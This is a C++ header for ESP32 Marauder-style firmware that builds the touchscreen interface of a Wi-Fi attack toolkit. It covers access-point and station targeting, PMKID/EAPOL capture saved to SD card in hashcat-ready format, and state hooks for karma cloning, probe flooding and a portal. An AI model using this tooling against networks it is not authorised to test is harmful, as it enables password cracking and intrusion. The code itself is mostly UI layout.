#ifndef MarauderScreen_h
#define MarauderScreen_h

// ---------------------------------------------------------------
// MarauderScreen.h — extended ESP32 Marauder feature screen
//
// Full-screen modal screen (created via lv_obj_create(NULL)) with
// an internal 5-tab tabview:
//   TARGETS    — AP scan, station enumeration, persisted selection
//   PMKID      — passive EAPOL capture, dumps hashcat .pmkid to SD
//   PKT GRAPH  — live strip chart of mgmt/data/probe packet counts
//   SIGNAL     — per-target-AP RSSI bar chart
//   CHANNEL    — 1-14 channel activity histogram
//
// All LVGL widgets created on Core 0 via event handlers, or on
// Core 1 inside xSemaphoreTake(lvgl_mutex) — same convention as
// the rest of the codebase. State machine drives capture loops.
// ---------------------------------------------------------------

#include <lvgl.h>
#include <ui.h>
#include <SD.h>
#include "WiFi/WiFiMarauder.h"
#include "SD/SDCard.h"

// Forward decl: state machine + global state lives in main.cpp
extern uint8_t currentState;

// State enum values are in Display/Event.h — referenced numerically here
// (Event.h is not header-safe).
#define MAR_STATE_IDLE          0
#define MAR_STATE_AP_SCAN       23  // STATE_MAR_APSCAN
#define MAR_STATE_STA_SCAN      24  // STATE_MAR_STA_SCAN
#define MAR_STATE_PMKID         25  // STATE_MAR_PMKID
#define MAR_STATE_PKTGRAPH      26  // STATE_MAR_PKTGRAPH
#define MAR_STATE_SIGMON        27  // STATE_MAR_SIGMON
#define MAR_STATE_CHANANA       28  // STATE_MAR_CHANANA
#define MAR_STATE_PWN           29
#define MAR_STATE_MACTRACK      30
#define MAR_STATE_PROBEFLOOD    31
#define MAR_STATE_RAWSNIFF      32
#define MAR_STATE_KARMA_LISTEN  33
#define MAR_STATE_KARMA_CLONE   34
#define MAR_STATE_ASSOC_SLEEP   35
#define MAR_STATE_BADMSG        36
#define MAR_STATE_SAE           37
#define MAR_STATE_PINGSCAN      38
#define MAR_STATE_PORTAL        39

#define MAR_BG     0x080810
#define MAR_PANEL  0x060612
#define MAR_ACCENT 0xFF9100
#define MAR_CYAN   0x00DDFF
#define MAR_GREEN  0x00FF88
#define MAR_RED    0xFF4466
#define MAR_DIM    0x556677

// ============================================================
// Marauder screen state — single global instance
// ============================================================
struct MarauderUI {
    bool      initialized;
    lv_obj_t *screen;
    lv_obj_t *tabview;

    // TARGETS tab
    lv_obj_t *tab_targets;
    lv_obj_t *lbl_tg_status;
    lv_obj_t *list_aps;          // lv_list of APs
    lv_obj_t *list_stations;     // lv_list of stations
    lv_obj_t *btn_scan_aps;
    lv_obj_t *btn_scan_sta;
    lv_obj_t *btn_save;
    lv_obj_t *lbl_count;

    // PMKID tab
    lv_obj_t *tab_pmkid;
    lv_obj_t *lbl_pmkid_status;
    lv_obj_t *lbl_pmkid_count;
    lv_obj_t *lbl_eapol_count;
    lv_obj_t *btn_pmkid_start;
    lv_obj_t *btn_pmkid_stop;
    lv_obj_t *btn_pmkid_save;
    lv_obj_t *txt_pmkid_log;

    // PKT GRAPH tab
    lv_obj_t *tab_pktgraph;
    lv_obj_t *chart_pkt;
    lv_chart_series_t *ser_mgmt;
    lv_chart_series_t *ser_data;
    lv_chart_series_t *ser_probe;
    lv_obj_t *lbl_pkt_status;
    lv_obj_t *btn_pkt_toggle;
    uint32_t  last_mgmt, last_data, last_probe;

    // SIGNAL tab
    lv_obj_t *tab_sigmon;
    lv_obj_t *chart_sig;
    lv_chart_series_t *ser_sig;
    lv_obj_t *lbl_sig_status;
    lv_obj_t *btn_sig_refresh;

    // CHANNEL tab
    lv_obj_t *tab_chanana;
    lv_obj_t *chart_chan;
    lv_chart_series_t *ser_chan;
    lv_obj_t *lbl_chan_status;
    lv_obj_t *btn_chan_toggle;

    // OPS tab (extra features — sub-panels overlay one another)
    lv_obj_t *tab_ops;
    lv_obj_t *ops_menu;      // panel containing menu buttons
    lv_obj_t *ops_pwn;       // sub-panels
    lv_obj_t *ops_mac;
    lv_obj_t *ops_probe;
    lv_obj_t *ops_raw;
    lv_obj_t *ops_karma;
    lv_obj_t *ops_assoc;
    lv_obj_t *ops_bad;
    lv_obj_t *ops_sae;
    lv_obj_t *ops_ping;
    lv_obj_t *ops_portal;
    // widgets per panel
    lv_obj_t *pwn_list;
    lv_obj_t *pwn_lbl;
    lv_obj_t *mac_chart;
    lv_chart_series_t *mac_ser;
    lv_obj_t *mac_lbl_status;
    lv_obj_t *mac_dd;
    lv_obj_t *probe_lbl;
    lv_obj_t *raw_txt;
    lv_obj_t *raw_lbl;
    int32_t   raw_lastSeen;
    lv_obj_t *karma_list;
    lv_obj_t *karma_lbl;
    lv_obj_t *assoc_lbl;
    lv_obj_t *assoc_dd;
    lv_obj_t *bad_lbl;
    lv_obj_t *bad_dd;
    lv_obj_t *sae_lbl;
    lv_obj_t *sae_dd;
    lv_obj_t *ping_list;
    lv_obj_t *ping_lbl;
    lv_obj_t *portal_list;
    lv_obj_t *portal_lbl;
} static mar = {};

// Forward declarations
static void marauder_screen_build();
static void marauder_tab_targets_build();
static void marauder_tab_pmkid_build();
static void marauder_tab_pktgraph_build();
static void marauder_tab_sigmon_build();
static void marauder_tab_chanana_build();
static void marauder_tab_ops_build();
static void marauder_targets_refresh_aps();
static void marauder_targets_refresh_stations();
static void mar_ops_show_panel(lv_obj_t *panel);
static void mar_ops_show_menu();
static void mar_stop_all_ops();

// ============================================================
// Helpers
// ============================================================
static void mar_fmt_mac(char *dst, size_t n, const uint8_t *m) {
    snprintf(dst, n, "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
}

static void mar_style_btn(lv_obj_t *btn, uint32_t bg, uint32_t fg, const char *txt) {
    lv_obj_set_style_bg_color(btn, lv_color_hex(bg), 0);
    lv_obj_set_style_radius(btn, 4, 0);
    lv_obj_set_style_shadow_width(btn, 0, 0);
    lv_obj_t *l = lv_label_create(btn);
    lv_obj_set_align(l, LV_ALIGN_CENTER);
    lv_label_set_text(l, txt);
    lv_obj_set_style_text_color(l, lv_color_hex(fg), 0);
    lv_obj_set_style_text_font(l, &lv_font_montserrat_14, 0);
}

// ============================================================
// Entry point — build screen + load it
// ============================================================
// Refresh helpers used by load + after target changes
static void mar_refresh_target_ap_dd(lv_obj_t *dd);
static void mar_refresh_mac_dropdown();

static void marauder_screen_load() {
    if (!mar.initialized) marauder_screen_build();
    lv_scr_load(mar.screen);
    marauder_targets_refresh_aps();
    marauder_targets_refresh_stations();
    if (mar.mac_dd)   mar_refresh_mac_dropdown();
    if (mar.assoc_dd) mar_refresh_target_ap_dd(mar.assoc_dd);
    if (mar.bad_dd)   mar_refresh_target_ap_dd(mar.bad_dd);
    if (mar.sae_dd)   mar_refresh_target_ap_dd(mar.sae_dd);
    if (mar.ops_menu) mar_ops_show_menu();
}

// Exit button handler — back to WiFi Apps
static void mar_event_back(lv_event_t *e) {
    extern uint8_t currentState;
    // Stop any running capture
    if (currentState == MAR_STATE_AP_SCAN || currentState == MAR_STATE_STA_SCAN) {
        WiFiMarauder::stopStationScan();
        WiFiMarauder::deinit();
    } else if (currentState == MAR_STATE_PMKID) {
        WiFiMarauder::stopPMKIDScan();
        WiFiMarauder::deinit();
    } else if (currentState == MAR_STATE_PKTGRAPH) {
        WiFiMarauder::stopSniff();
        WiFiMarauder::deinit();
    } else if (currentState == MAR_STATE_CHANANA) {
        WiFiMarauder::stopChannelAnalyzer();
        WiFiMarauder::deinit();
    } else if (currentState >= MAR_STATE_PWN && currentState <= MAR_STATE_PORTAL) {
        mar_stop_all_ops();
    }
    currentState = MAR_STATE_IDLE;
    lv_scr_load(ui_scrWifiApps);
}

// ============================================================
// Build full screen
// ============================================================
static void marauder_screen_build() {
    mar.screen = lv_obj_create(NULL);
    lv_obj_set_style_bg_color(mar.screen, lv_color_hex(MAR_BG), 0);
    lv_obj_clear_flag(mar.screen, LV_OBJ_FLAG_SCROLLABLE);

    // Back button — left edge, below the status bar zone (y>=22 keeps
    // it clear of the WiFi/battery icons that live on lv_layer_top()).
    lv_obj_t *btn_back = lv_btn_create(mar.screen);
    lv_obj_set_size(btn_back, 56, 22);
    lv_obj_set_pos(btn_back, 4, 22);
    mar_style_btn(btn_back, 0x222244, 0xFFFFFF, "<" " BACK");
    lv_obj_add_event_cb(btn_back, mar_event_back, LV_EVENT_CLICKED, NULL);

    // Title bar — centered above the tab strip, away from status icons
    lv_obj_t *title = lv_label_create(mar.screen);
    lv_obj_set_pos(title, 80, 26);
    lv_label_set_text(title, "MANTIS");
    lv_obj_set_style_text_color(title, lv_color_hex(MAR_ACCENT), 0);
    lv_obj_set_style_text_font(title, &lv_font_montserrat_16, 0);

    // Tabview takes the rest. Tab bar styled to match SquareLine theme:
    // white background + orange Verdana14 text (much more readable than
    // the prior tiny montserrat 10).
    mar.tabview = lv_tabview_create(mar.screen, LV_DIR_TOP, 36);
    lv_obj_set_size(mar.tabview, 320, 432);
    lv_obj_set_pos(mar.tabview, 0, 48);
    lv_obj_set_style_bg_color(mar.tabview, lv_color_hex(MAR_BG), 0);
    {
        lv_obj_t *btns = lv_tabview_get_tab_btns(mar.tabview);
        lv_obj_set_style_bg_color(btns, lv_color_hex(0xFFFFFF), 0);
        lv_obj_set_style_bg_opa(btns, 255, 0);
        lv_obj_set_style_text_color(btns, lv_color_hex(0x000000), 0);
        lv_obj_set_style_text_font(btns, &ui_font_Verdana14, 0);
        // Selected tab indicator: orange highlight (LVGL tab selector is
        // LV_PART_ITEMS | LV_STATE_CHECKED for the active button background)
        lv_obj_set_style_bg_color(btns, lv_color_hex(MAR_ACCENT),
                                  LV_PART_ITEMS | LV_STATE_CHECKED);
        lv_obj_set_style_text_color(btns, lv_color_hex(0x000000),
                                    LV_PART_ITEMS | LV_STATE_CHECKED);
    }

    mar.tab_targets   = lv_tabview_add_tab(mar.tabview, "TGT");
    mar.tab_pmkid     = lv_tabview_add_tab(mar.tabview, "PMKID");
    mar.tab_pktgraph  = lv_tabview_add_tab(mar.tabview, "PKT");
    mar.tab_sigmon    = lv_tabview_add_tab(mar.tabview, "SIG");
    mar.tab_chanana   = lv_tabview_add_tab(mar.tabview, "CH");
    mar.tab_ops       = lv_tabview_add_tab(mar.tabview, "OPS");

    // Apply MAR_BG to every tab content area
    for (lv_obj_t *t : { mar.tab_targets, mar.tab_pmkid, mar.tab_pktgraph,
                         mar.tab_sigmon, mar.tab_chanana, mar.tab_ops }) {
        lv_obj_set_style_bg_color(t, lv_color_hex(MAR_BG), 0);
        lv_obj_set_style_pad_all(t, 2, 0);
    }

    marauder_tab_targets_build();
    marauder_tab_pmkid_build();
    marauder_tab_pktgraph_build();
    marauder_tab_sigmon_build();
    marauder_tab_chanana_build();
    marauder_tab_ops_build();

    // Load any persisted target selections
    WiFiMarauder::loadTargetsFromNVS();

    mar.initialized = true;
}

// ============================================================
// TARGETS TAB
// ============================================================
static void mar_ap_item_cb(lv_event_t *e) {
    // user data is the AP index
    int idx = (int)(intptr_t)lv_event_get_user_data(e);
    if (idx < 0 || idx >= WiFiMarauder::targetCount) return;
    WiFiMarauder::toggleAPSelection(WiFiMarauder::targets[idx].bssid);
    marauder_targets_refresh_aps();
}
static void mar_station_item_cb(lv_event_t *e) {
    int idx = (int)(intptr_t)lv_event_get_user_data(e);
    if (idx < 0 || idx >= WiFiMarauder::stationCount) return;
    WiFiMarauder::toggleStationSelection(WiFiMarauder::stations[idx].mac);
    marauder_targets_refresh_stations();
}

static void mar_event_scan_aps(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    lv_label_set_text(mar.lbl_tg_status, "Scanning APs...");
    lv_obj_set_style_text_color(mar.lbl_tg_status, lv_color_hex(MAR_CYAN), 0);
    currentState = MAR_STATE_AP_SCAN;
}
static void mar_event_scan_sta(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    if (WiFiMarauder::targetCount == 0) {
        lv_label_set_text(mar.lbl_tg_status, "Scan APs first");
        lv_obj_set_style_text_color(mar.lbl_tg_status, lv_color_hex(MAR_RED), 0);
        return;
    }
    lv_label_set_text(mar.lbl_tg_status, "Enumerating stations...");
    lv_obj_set_style_text_color(mar.lbl_tg_status, lv_color_hex(MAR_CYAN), 0);
    WiFiMarauder::init();
    WiFiMarauder::startStationScan();
    currentState = MAR_STATE_STA_SCAN;
}
static void mar_event_save_targets(lv_event_t *e) {
    WiFiMarauder::saveTargetsToNVS();
    char buf[64];
    snprintf(buf, sizeof(buf), "Saved: %d APs, %d STA",
             WiFiMarauder::targetAPCount, WiFiMarauder::targetStationCount);
    lv_label_set_text(mar.lbl_tg_status, buf);
    lv_obj_set_style_text_color(mar.lbl_tg_status, lv_color_hex(MAR_GREEN), 0);
}

static void marauder_tab_targets_build() {
    lv_obj_t *t = mar.tab_targets;
    lv_obj_clear_flag(t, LV_OBJ_FLAG_SCROLLABLE);

    // Buttons row
    mar.btn_scan_aps = lv_btn_create(t);
    lv_obj_set_size(mar.btn_scan_aps, 90, 26);
    lv_obj_set_pos(mar.btn_scan_aps, 2, 2);
    mar_style_btn(mar.btn_scan_aps, 0x113355, MAR_CYAN, "SCAN APs");
    lv_obj_add_event_cb(mar.btn_scan_aps, mar_event_scan_aps, LV_EVENT_CLICKED, NULL);

    mar.btn_scan_sta = lv_btn_create(t);
    lv_obj_set_size(mar.btn_scan_sta, 90, 26);
    lv_obj_set_pos(mar.btn_scan_sta, 98, 2);
    mar_style_btn(mar.btn_scan_sta, 0x222244, MAR_ACCENT, "SCAN STA");
    lv_obj_add_event_cb(mar.btn_scan_sta, mar_event_scan_sta, LV_EVENT_CLICKED, NULL);

    mar.btn_save = lv_btn_create(t);
    lv_obj_set_size(mar.btn_save, 90, 26);
    lv_obj_set_pos(mar.btn_save, 194, 2);
    mar_style_btn(mar.btn_save, 0x004422, MAR_GREEN, "SAVE NVS");
    lv_obj_add_event_cb(mar.btn_save, mar_event_save_targets, LV_EVENT_CLICKED, NULL);

    // Status
    mar.lbl_tg_status = lv_label_create(t);
    lv_obj_set_pos(mar.lbl_tg_status, 2, 32);
    lv_obj_set_width(mar.lbl_tg_status, 310);
    lv_label_set_text(mar.lbl_tg_status, "Ready - press SCAN APs");
    lv_obj_set_style_text_color(mar.lbl_tg_status, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.lbl_tg_status, &lv_font_montserrat_14, 0);

    // AP list header
    lv_obj_t *h1 = lv_label_create(t);
    lv_obj_set_pos(h1, 2, 48);
    lv_label_set_text(h1, "APs (tap to select):");
    lv_obj_set_style_text_color(h1, lv_color_hex(MAR_ACCENT), 0);
    lv_obj_set_style_text_font(h1, &lv_font_montserrat_14, 0);

    mar.list_aps = lv_list_create(t);
    lv_obj_set_size(mar.list_aps, 314, 90);
    lv_obj_set_pos(mar.list_aps, 2, 62);
    lv_obj_set_style_bg_color(mar.list_aps, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.list_aps, lv_color_hex(0x222244), 0);
    lv_obj_set_style_border_width(mar.list_aps, 1, 0);
    lv_obj_set_style_pad_all(mar.list_aps, 2, 0);

    // Stations list header
    lv_obj_t *h2 = lv_label_create(t);
    lv_obj_set_pos(h2, 2, 156);
    lv_label_set_text(h2, "Stations (tap to select):");
    lv_obj_set_style_text_color(h2, lv_color_hex(MAR_ACCENT), 0);
    lv_obj_set_style_text_font(h2, &lv_font_montserrat_14, 0);

    mar.list_stations = lv_list_create(t);
    lv_obj_set_size(mar.list_stations, 314, 84);
    lv_obj_set_pos(mar.list_stations, 2, 170);
    lv_obj_set_style_bg_color(mar.list_stations, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.list_stations, lv_color_hex(0x222244), 0);
    lv_obj_set_style_border_width(mar.list_stations, 1, 0);
    lv_obj_set_style_pad_all(mar.list_stations, 2, 0);
}

static void marauder_targets_refresh_aps() {
    if (!mar.list_aps) return;
    lv_obj_clean(mar.list_aps);
    for (int i = 0; i < WiFiMarauder::targetCount; i++) {
        const auto &t = WiFiMarauder::targets[i];
        bool sel = WiFiMarauder::isAPSelected(t.bssid);
        char buf[80];
        snprintf(buf, sizeof(buf), "%c %-16.16s ch%-2d %ddBm",
                 sel ? '*' : ' ', t.ssid, t.channel, t.rssi);
        lv_obj_t *btn = lv_list_add_btn(mar.list_aps, NULL, buf);
        lv_obj_set_style_bg_color(btn, lv_color_hex(sel ? 0x113355 : MAR_PANEL), 0);
        lv_obj_set_style_text_color(btn, lv_color_hex(sel ? MAR_CYAN : 0xCCCCCC), 0);
        lv_obj_set_style_text_font(btn, &lv_font_montserrat_14, 0);
        lv_obj_set_style_pad_all(btn, 3, 0);
        lv_obj_add_event_cb(btn, mar_ap_item_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
    }
    char st[64];
    snprintf(st, sizeof(st), "%d APs found, %d selected",
             WiFiMarauder::targetCount, WiFiMarauder::targetAPCount);
    if (WiFiMarauder::targetCount > 0)
        lv_label_set_text(mar.lbl_tg_status, st);
}

static void marauder_targets_refresh_stations() {
    if (!mar.list_stations) return;
    lv_obj_clean(mar.list_stations);
    for (int i = 0; i < WiFiMarauder::stationCount; i++) {
        const auto &s = WiFiMarauder::stations[i];
        bool sel = WiFiMarauder::isStationSelected(s.mac);
        char mac[20], ap[20], buf[80];
        mar_fmt_mac(mac, sizeof(mac), s.mac);
        mar_fmt_mac(ap,  sizeof(ap),  s.ap_bssid);
        snprintf(buf, sizeof(buf), "%c %s ch%-2d %ddBm",
                 sel ? '*' : ' ', mac, s.channel, s.rssi);
        lv_obj_t *btn = lv_list_add_btn(mar.list_stations, NULL, buf);
        lv_obj_set_style_bg_color(btn, lv_color_hex(sel ? 0x113355 : MAR_PANEL), 0);
        lv_obj_set_style_text_color(btn, lv_color_hex(sel ? MAR_CYAN : 0xCCCCCC), 0);
        lv_obj_set_style_text_font(btn, &lv_font_montserrat_14, 0);
        lv_obj_set_style_pad_all(btn, 3, 0);
        lv_obj_add_event_cb(btn, mar_station_item_cb, LV_EVENT_CLICKED, (void *)(intptr_t)i);
    }
}

// ============================================================
// PMKID TAB
// ============================================================
static void mar_event_pmkid_start(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState != MAR_STATE_IDLE) return;
    WiFiMarauder::init();
    WiFiMarauder::startPMKIDScan();
    lv_label_set_text(mar.lbl_pmkid_status, "Capturing EAPOL...");
    lv_obj_set_style_text_color(mar.lbl_pmkid_status, lv_color_hex(MAR_GREEN), 0);
    lv_textarea_set_text(mar.txt_pmkid_log, "");
    currentState = MAR_STATE_PMKID;
}
static void mar_event_pmkid_stop(lv_event_t *e) {
    extern uint8_t currentState;
    WiFiMarauder::stopPMKIDScan();
    WiFiMarauder::deinit();
    lv_label_set_text(mar.lbl_pmkid_status, "Stopped");
    lv_obj_set_style_text_color(mar.lbl_pmkid_status, lv_color_hex(MAR_DIM), 0);
    currentState = MAR_STATE_IDLE;
}
static void mar_event_pmkid_save(lv_event_t *e) {
    if (WiFiMarauder::pmkidCount == 0) {
        lv_label_set_text(mar.lbl_pmkid_status, "No PMKIDs to save");
        lv_obj_set_style_text_color(mar.lbl_pmkid_status, lv_color_hex(MAR_RED), 0);
        return;
    }
    if (!sd_card_is_present()) {
        lv_label_set_text(mar.lbl_pmkid_status, "SD card missing");
        lv_obj_set_style_text_color(mar.lbl_pmkid_status, lv_color_hex(MAR_RED), 0);
        return;
    }
    if (!SD.exists("/mantis")) SD.mkdir("/mantis");
    char fname[48];
    snprintf(fname, sizeof(fname), "/mantis/pmkid_%lu.txt", (unsigned long)millis());
    File f = SD.open(fname, FILE_WRITE);
    if (!f) {
        lv_label_set_text(mar.lbl_pmkid_status, "SD open failed");
        lv_obj_set_style_text_color(mar.lbl_pmkid_status, lv_color_hex(MAR_RED), 0);
        now_close_sd_card();
        return;
    }
    // hashcat 22000-ready PMKID format: PMKID*MAC_AP*MAC_STA*ESSID_HEX
    for (int i = 0; i < WiFiMarauder::pmkidCount; i++) {
        const auto &p = WiFiMarauder::pmkids[i];
        for (int j = 0; j < 16; j++) f.printf("%02x", p.pmkid[j]);
        f.print('*');
        for (int j = 0; j < 6; j++) f.printf("%02x", p.mac_ap[j]);
        f.print('*');
        for (int j = 0; j < 6; j++) f.printf("%02x", p.mac_sta[j]);
        f.print('*');
        for (size_t j = 0; j < strlen(p.ssid); j++) f.printf("%02x", (uint8_t)p.ssid[j]);
        f.print('\n');
    }
    f.close();
    now_close_sd_card();
    char buf[64];
    snprintf(buf, sizeof(buf), "Saved %d to %s", WiFiMarauder::pmkidCount, fname);
    lv_label_set_text(mar.lbl_pmkid_status, buf);
    lv_obj_set_style_text_color(mar.lbl_pmkid_status, lv_color_hex(MAR_GREEN), 0);
}

static void marauder_tab_pmkid_build() {
    lv_obj_t *t = mar.tab_pmkid;
    lv_obj_clear_flag(t, LV_OBJ_FLAG_SCROLLABLE);

    mar.btn_pmkid_start = lv_btn_create(t);
    lv_obj_set_size(mar.btn_pmkid_start, 90, 26);
    lv_obj_set_pos(mar.btn_pmkid_start, 2, 2);
    mar_style_btn(mar.btn_pmkid_start, 0x004422, MAR_GREEN, ">" " START");
    lv_obj_add_event_cb(mar.btn_pmkid_start, mar_event_pmkid_start, LV_EVENT_CLICKED, NULL);

    mar.btn_pmkid_stop = lv_btn_create(t);
    lv_obj_set_size(mar.btn_pmkid_stop, 90, 26);
    lv_obj_set_pos(mar.btn_pmkid_stop, 98, 2);
    mar_style_btn(mar.btn_pmkid_stop, 0x550022, MAR_RED, "#" " STOP");
    lv_obj_add_event_cb(mar.btn_pmkid_stop, mar_event_pmkid_stop, LV_EVENT_CLICKED, NULL);

    mar.btn_pmkid_save = lv_btn_create(t);
    lv_obj_set_size(mar.btn_pmkid_save, 90, 26);
    lv_obj_set_pos(mar.btn_pmkid_save, 194, 2);
    mar_style_btn(mar.btn_pmkid_save, 0x113355, MAR_CYAN, "SAVE" " SD");
    lv_obj_add_event_cb(mar.btn_pmkid_save, mar_event_pmkid_save, LV_EVENT_CLICKED, NULL);

    mar.lbl_pmkid_status = lv_label_create(t);
    lv_obj_set_pos(mar.lbl_pmkid_status, 2, 32);
    lv_obj_set_width(mar.lbl_pmkid_status, 310);
    lv_label_set_text(mar.lbl_pmkid_status, "Ready");
    lv_obj_set_style_text_color(mar.lbl_pmkid_status, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.lbl_pmkid_status, &lv_font_montserrat_14, 0);

    mar.lbl_pmkid_count = lv_label_create(t);
    lv_obj_set_pos(mar.lbl_pmkid_count, 2, 50);
    lv_label_set_text(mar.lbl_pmkid_count, "PMKIDs: 0");
    lv_obj_set_style_text_color(mar.lbl_pmkid_count, lv_color_hex(MAR_ACCENT), 0);
    lv_obj_set_style_text_font(mar.lbl_pmkid_count, &lv_font_montserrat_14, 0);

    mar.lbl_eapol_count = lv_label_create(t);
    lv_obj_set_pos(mar.lbl_eapol_count, 150, 50);
    lv_label_set_text(mar.lbl_eapol_count, "EAPOL: 0");
    lv_obj_set_style_text_color(mar.lbl_eapol_count, lv_color_hex(MAR_CYAN), 0);
    lv_obj_set_style_text_font(mar.lbl_eapol_count, &lv_font_montserrat_14, 0);

    lv_obj_t *hdr = lv_label_create(t);
    lv_obj_set_pos(hdr, 2, 72);
    lv_label_set_text(hdr, "CAPTURED PMKIDS:");
    lv_obj_set_style_text_color(hdr, lv_color_hex(MAR_ACCENT), 0);
    lv_obj_set_style_text_font(hdr, &lv_font_montserrat_14, 0);

    mar.txt_pmkid_log = lv_textarea_create(t);
    lv_obj_set_size(mar.txt_pmkid_log, 314, 170);
    lv_obj_set_pos(mar.txt_pmkid_log, 2, 86);
    lv_obj_set_style_bg_color(mar.txt_pmkid_log, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_text_color(mar.txt_pmkid_log, lv_color_hex(0xCCCCCC), 0);
    lv_obj_set_style_text_font(mar.txt_pmkid_log, &lv_font_montserrat_14, 0);
    lv_obj_set_style_border_color(mar.txt_pmkid_log, lv_color_hex(0x222244), 0);
    lv_textarea_set_text(mar.txt_pmkid_log, "");
    lv_obj_clear_flag(mar.txt_pmkid_log, LV_OBJ_FLAG_CLICK_FOCUSABLE);
}

// ============================================================
// PKT GRAPH TAB
// ============================================================
static void mar_event_pkt_toggle(lv_event_t *e) {
    extern uint8_t currentState;
    if (currentState == MAR_STATE_PKTGRAPH) {
        WiFiMarauder::stopSniff();
        WiFiMarauder::deinit();
        currentState = MAR_STATE_IDLE;
        lv_label_set_text(mar.lbl_pkt_status, "Stopped");
        lv_obj_set_style_text_color(mar.lbl_pkt_status, lv_color_hex(MAR_DIM), 0);
    } else if (currentState == MAR_STATE_IDLE) {
        // Reset baselines
        WiFiMarauder::pktMgmt = 0;
        WiFiMarauder::pktData = 0;
        WiFiMarauder::probeCount = 0;
        mar.last_mgmt = 0; mar.last_data = 0; mar.last_probe = 0;
        // Clear chart
        lv_chart_set_all_value(mar.chart_pkt, mar.ser_mgmt, 0);
        lv_chart_set_all_value(mar.chart_pkt, mar.ser_data, 0);
        lv_chart_set_all_value(mar.chart_pkt, mar.ser_probe, 0);
        lv_chart_refresh(mar.chart_pkt);
        WiFiMarauder::init();
        WiFiMarauder::startSniff();
        lv_label_set_text(mar.lbl_pkt_status, "Counting...");
        lv_obj_set_style_text_color(mar.lbl_pkt_status, lv_color_hex(MAR_GREEN), 0);
        currentState = MAR_STATE_PKTGRAPH;
    }
}
static void marauder_tab_pktgraph_build() {
    lv_obj_t *t = mar.tab_pktgraph;
    lv_obj_clear_flag(t, LV_OBJ_FLAG_SCROLLABLE);

    mar.btn_pkt_toggle = lv_btn_create(t);
    lv_obj_set_size(mar.btn_pkt_toggle, 110, 26);
    lv_obj_set_pos(mar.btn_pkt_toggle, 2, 2);
    mar_style_btn(mar.btn_pkt_toggle, 0x004422, MAR_GREEN, ">" " START");
    lv_obj_add_event_cb(mar.btn_pkt_toggle, mar_event_pkt_toggle, LV_EVENT_CLICKED, NULL);

    mar.lbl_pkt_status = lv_label_create(t);
    lv_obj_set_pos(mar.lbl_pkt_status, 116, 8);
    lv_label_set_text(mar.lbl_pkt_status, "Stopped");
    lv_obj_set_style_text_color(mar.lbl_pkt_status, lv_color_hex(MAR_DIM), 0);
    lv_obj_set_style_text_font(mar.lbl_pkt_status, &lv_font_montserrat_14, 0);

    // Legend
    lv_obj_t *leg = lv_label_create(t);
    lv_obj_set_pos(leg, 2, 34);
    lv_label_set_text(leg, "#FF9100 MGMT#  #00DDFF DATA#  #00FF88 PROBE#");
    lv_label_set_recolor(leg, true);
    lv_obj_set_style_text_font(leg, &lv_font_montserrat_14, 0);

    mar.chart_pkt = lv_chart_create(t);
    lv_obj_set_size(mar.chart_pkt, 312, 200);
    lv_obj_set_pos(mar.chart_pkt, 2, 50);
    lv_obj_set_style_bg_color(mar.chart_pkt, lv_color_hex(MAR_PANEL), 0);
    lv_obj_set_style_border_color(mar.chart_pkt, lv_color_hex(0x222244), 0);
    lv_obj_set_style_line_color(mar.chart_pkt, lv_color_hex(0x222244), LV_PART_MAIN);
    lv_chart_set_type(mar.chart_pkt, LV_CHART_TYPE_LINE);
    lv_chart_set_point_count(mar.chart_pkt, 60);
    lv_chart_set_div_line_count(mar.chart_pkt, 4, 6);
    lv_chart_set_range(mar.chart_pkt, LV_CHART_AXIS_PRIMARY_Y, 0, 100);
    lv_chart_set_update_mode(mar.chart_pkt, LV_CHART_UPDATE_MODE_SHIFT);
    lv_obj_set_style_size(mar.chart_pkt, 0, LV_PART_INDICATOR);

    mar.ser_mgmt  = lv_chart_add_series(mar.chart_pkt, lv_color_hex(MAR_ACCENT),
                                        LV_CHART_AXIS_PRIMARY_Y);
    mar.ser_data  = lv_chart_add_series(mar.chart_pkt, lv_color_hex(MAR_CYAN),
                                        LV_CHART_AXIS_PRIMARY_Y);
    mar.ser_probe = lv_chart_add_series(mar.chart_pkt, lv_color_hex(MAR_GREEN),
                                        LV_CHART_AXIS_PRIMARY_Y);
    lv_chart_set_all_value(mar.chart_pkt, mar.ser_mgmt, 0);
    lv_chart_set_all_value(mar.chart_pkt, mar.ser_data, 0);
    lv_chart_set_all_value(mar.chart_pkt, mar.ser_probe, 0);
}

// ============================================================
// SIGNAL MON TAB — bar chart of selected/scanned AP RSSI
// ============================================================
static void mar_event_sig_refresh(lv_event_t *e) {
    if (!mar.chart_sig) return;
    int n = WiFiMarauder::targetCount;
    if (n == 0) {
        lv_label_set_text(mar.lbl_sig_status, "No APs - scan first");
        lv_obj_set_style_text_color(mar.lbl_sig_status, lv_color_hex(MAR_RED), 0);
        return;
    }
    if (n > 20) n = 20;
    lv_chart_set_point_count(mar.chart_sig, n);
    for (int i = 0; i < n; i++) {
        int rssi = WiFiMarauder::targets[i].rssi;
        // map -100..-30 to 0..70 for chart range
        int v = rssi + 100;
        if (v < 0) v = 0;
        if (v > 70) v = 70;
        lv_chart_set_value_by_id(mar.chart_sig, mar.ser_sig, i, v);
    }
    lv_chart_refresh(mar.chart_sig);
    char buf[64];
    snprintf(buf, sizeof(buf), "Showing %d APs (0=-100 dBm, 70=-30 dBm)", n);
    lv_label_set_text(mar.lbl_sig_status, buf);
    lv_obj_set_style_text_color(mar.lbl_sig_status, lv_color_hex(MAR_CYAN), 0);
}

static void marauder_tab_sigmon_build() {
    lv_obj_t *t = mar.tab_sigmon;
    lv_obj_clear_flag(t, LV_OBJ_FLAG_SCROLLABLE);

    mar.btn_sig_refresh = lv_btn_create(t);
    lv_obj_set_size(mar.btn_sig_refresh, 110, 26);
    lv_obj_set_pos(mar.btn_sig_refresh, 2, 2);
    mar_style_btn(mar.btn_sig_refresh, 0x113355, MAR_CYAN, "R" " REFRESH");
